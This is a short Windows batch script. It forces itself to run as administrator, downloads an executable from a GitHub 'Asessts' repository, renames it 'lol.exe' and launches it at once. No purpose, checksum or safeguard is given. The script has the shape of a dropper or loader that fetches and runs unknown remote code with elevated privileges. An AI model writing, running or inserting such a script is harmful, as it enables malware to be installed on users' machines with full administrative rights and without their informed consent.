@echo off
:: Check if the script is running with administrative privileges
:: If not, restart with admin privileges

:: Check for admin privileges
>nul 2>&1 ( 
    powershell -command "Start-Process '%~f0' -Verb RunAs" 
    if %errorlevel% neq 0 exit /b %errorlevel%
)

:: Change the working directory to where the script is located
cd /d "%~dp0"

:: Set the URL and file names
set "URL=https://github.com/12KrishnaPuri/Asessts/raw/main/ytt.exe"
set "FILENAME=lol.exe"

:: Download the file
echo Downloading %URL%...
powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%FILENAME%'"

:: Check if the file was downloaded successfully
if exist "%FILENAME%" (
    echo File downloaded successfully.
) else (
    echo Failed to download the file.
    exit /b 1
)

:: Run the downloaded file
echo Running %FILENAME%...
start "" "%FILENAME%"

:: End of script
exit /b 0
